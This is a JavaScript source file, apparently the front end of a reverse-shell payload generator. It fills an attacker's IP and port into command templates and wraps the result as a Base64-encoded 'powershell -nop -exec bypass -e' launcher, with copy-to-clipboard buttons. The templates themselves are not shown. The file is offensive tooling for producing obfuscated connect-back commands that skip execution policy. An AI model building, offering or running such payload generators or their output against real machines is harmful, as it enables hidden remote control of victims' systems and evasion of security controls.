document.addEventListener('DOMContentLoaded', () => {
  const ipEl = document.getElementById('ip');
  const portEl = document.getElementById('port');
  const raw = document.getElementById('raw');
  const b64 = document.getElementById('base64');
  const copyRaw = document.getElementById('copy-raw');
  const copy64 = document.getElementById('copy');
  const tabsContainer = document.getElementById('tabs');

  let templates = [];
  let currentIdx = 0;

  fetch('templates.json')
    .then(r => r.json())
    .then(data => {
      templates = data;
      renderTabs();
      renderContent();
    })
    .catch(err => console.error('Load templates error:', err));

  function renderTabs() {
    tabsContainer.innerHTML = '';
    templates.forEach((t, idx) => {
      const btn = document.createElement('button');
      btn.textContent = t.name;
      btn.className = 'tab-btn';
      btn.dataset.index = idx;
      if (idx === 0) btn.classList.add('active');
      btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        currentIdx = idx;
        renderContent();
      });
      tabsContainer.appendChild(btn);
    });
  }

  function renderContent() {
    const tpl = templates[currentIdx];
    const rawTemplate = tpl.template;

    const cmd = rawTemplate
      .replace(/\{\{ip\}\}/g, ipEl.value)
      .replace(/\{\{port\}\}/g, portEl.value);
    raw.value = cmd;
    updateBase64(cmd);
  }

  function updateBase64(cmdText) {
    try {
      const enc = btoa(unescape(encodeURIComponent(cmdText)));
      b64.value = `powershell -nop -exec bypass -e ${enc}`;
    } catch {
      b64.value = 'Base64 encoding error';
    }
  }

  [ipEl, portEl].forEach(el => el.addEventListener('input', renderContent));
  raw.addEventListener('input', () => updateBase64(raw.value));

  copy64.addEventListener('click', () => {
    navigator.clipboard.writeText(b64.value)
      .then(() => {
        copy64.textContent = 'Copied!';
        setTimeout(() => copy64.textContent = 'Copy Base64 Command', 1500);
      });
  });

  copyRaw.addEventListener('click', () => {
    navigator.clipboard.writeText(raw.value)
      .then(() => {
        copyRaw.textContent = 'Copied!';
        setTimeout(() => copyRaw.textContent = 'Copy Raw Command', 1500);
      });
  });
});
